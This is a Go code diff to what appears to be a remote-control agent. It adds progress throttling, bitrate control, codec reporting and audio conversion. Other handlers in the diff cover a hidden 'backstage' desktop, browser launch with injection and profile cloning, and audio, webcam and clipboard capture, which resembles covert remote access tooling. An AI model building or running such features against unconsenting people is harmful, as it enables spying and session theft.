@@ -45,6 +45,22 @@ var (
 	fileHashSlots         = make(chan struct{}, 2)
 )
 
+const cloneProgressMinInterval = 100 * time.Millisecond
+
+type cloneProgressLimiter struct {
+	lastSent time.Time
+}
+
+func (l *cloneProgressLimiter) allow(now time.Time, copiedBytes int64, status string) bool {
+	initial := status == "scanning" || (status == "cloning" && copiedBytes == 0)
+	terminal := status == "done" || strings.HasPrefix(status, "done_with_errors|")
+	if !initial && !terminal && !l.lastSent.IsZero() && now.Sub(l.lastSent) < cloneProgressMinInterval {
+		return false
+	}
+	l.lastSent = now
+	return true
+}
+
 type backstageInputKind int
 
 const (
@@ -514,6 +530,7 @@ func startDesktopAudioSession(ctx context.Context, env *runtime.Env, sessionID s
 	stopDesktopAudioSession()
 
 	vCtx, cancel := context.WithCancel(ctx)
+	legacyConverter := &desktopAudioLegacyConverter{}
 	session, err := audio.StartCaptureOnlySession(vCtx, source, func(chunk []byte) {
 		if len(chunk) == 0 {
 			return
@@ -524,10 +541,14 @@ func startDesktopAudioSession(ctx context.Context, env *runtime.Env, sessionID s
 			samples := pcm16BytesToInt16(chunk)
 			_ = webrtcpub.WriteAudio(webrtcpub.KindAudio, samples)
 		}
+		legacyPCM := legacyConverter.Convert(chunk)
+		if len(legacyPCM) == 0 {
+			return
+		}
 		msg := map[string]interface{}{
 			"type":      "desktop_audio_uplink",
 			"sessionId": sessionID,
-			"data":      chunk,
+			"data":      legacyPCM,
 		}
 		_ = wire.WriteMsg(vCtx, env.Conn, msg)
 	})
@@ -838,7 +859,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			log.Printf("desktop: set quality=%d codec=%s software_h264=%v", quality, codec, softwareH264)
 		}
 		capture.SetDesktopSoftwareH264(softwareH264)
-		capture.SetQualityAndCodec(quality, codec)
+		capture.SetDesktopQualityAndCodec(quality, codec)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "desktop_request_keyframe":
@@ -895,9 +916,16 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 					FPS: profile.FPS, Label: profile.Label, Providers: profile.Providers,
 				})
 			}
+			codecs := make([]wire.DesktopCodecCapability, 0, len(caps.Codecs))
+			for _, codec := range caps.Codecs {
+				codecs = append(codecs, wire.DesktopCodecCapability{
+					Codec: codec.Codec, Encoders: codec.Encoders,
+					Transports: codec.Transports, Hardware: codec.Hardware,
+				})
+			}
 			if err := wire.WriteMsg(ctx, env.Conn, wire.DesktopEncoderCapabilities{
 				Type: "desktop_encoder_capabilities", CommandID: cmdID, Probed: caps.Probed,
-				Display: caps.Display, Profiles: profiles, Detail: caps.Detail,
+				Display: caps.Display, Profiles: profiles, Codecs: codecs, Detail: caps.Detail,
 			}); err != nil {
 				log.Printf("desktop: encoder capability result send failed: %v", err)
 			}
@@ -913,6 +941,29 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		}
 		fps = SetDesktopTargetFPS(fps)
 		log.Printf("desktop: set target fps=%d", fps)
+		sendCommandResultSafe(env, cmdID, true, "")
+		return nil
+	case "desktop_set_bitrate":
+		payload, _ := envelope["payload"].(map[string]interface{})
+		bitrateMbps := 0
+		adaptive := false
+		if payload != nil {
+			if v, ok := payloadInt(payload, "bitrateMbps"); ok {
+				bitrateMbps = v
+			}
+			if v, ok := payload["adaptive"].(bool); ok {
+				adaptive = v
+			}
+		}
+		if bitrateMbps < 0 {
+			bitrateMbps = 0
+		}
+		if bitrateMbps > 50 {
+			bitrateMbps = 50
+		}
+		capture.SetH264NetworkAdaptive(adaptive)
+		bps := capture.SetH264TargetBitrate(bitrateMbps * 1_000_000)
+		log.Printf("desktop: set target bitrate=%d Mbps (0=auto) adaptive=%v", bps/1_000_000, adaptive)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "clipboard_sync_start":
@@ -1093,6 +1144,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				VirtualMode = v
 			}
 		}
+		capture.RequestDesktopRecoveryAfterBackstageStart()
 		if VirtualMode {
 			env.VirtualMu.Lock()
 			if env.VirtualCancel != nil {
@@ -1311,7 +1363,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		log.Printf("backstage: set quality=%d codec=%s", quality, codec)
-		capture.SetQualityAndCodec(quality, codec)
+		capture.SetBackstageQualityAndCodec(quality, codec)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "backstage_request_keyframe":
@@ -2039,7 +2091,11 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		goSafe("backstage_start_browser_injected", nil, func() {
 			var onProgress capture.CloneProgressFunc
 			if clone {
+				var limiter cloneProgressLimiter
 				onProgress = func(percent int, copiedBytes, totalBytes int64, status string) {
+					if !limiter.allow(time.Now(), copiedBytes, status) {
+						return
+					}
 					_ = wire.WriteMsg(context.Background(), env.Conn, wire.BackstageCloneProgress{
 						Type:        "backstage_clone_progress",
 						Browser:     browser,
@@ -2082,6 +2138,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				autoStartExplorer = v
 			}
 		}
+		capture.RequestDesktopRecoveryAfterBackstageStart()
 		env.VirtualMu.Lock()
 		if env.VirtualCancel != nil {
 			env.VirtualCancel()
@@ -2185,7 +2242,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		log.Printf("hidden: set quality=%d codec=%s", quality, codec)
-		capture.SetQualityAndCodec(quality, codec)
+		capture.SetBackstageQualityAndCodec(quality, codec)
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "virtual_request_keyframe":
@@ -2423,6 +2480,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			fps = clampedFPS
 		}
 		env.WebcamFPS = fps
+		capture.SetWebcamH264TargetFPS(fps)
 		env.WebcamUseMaxFPS = useMax
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
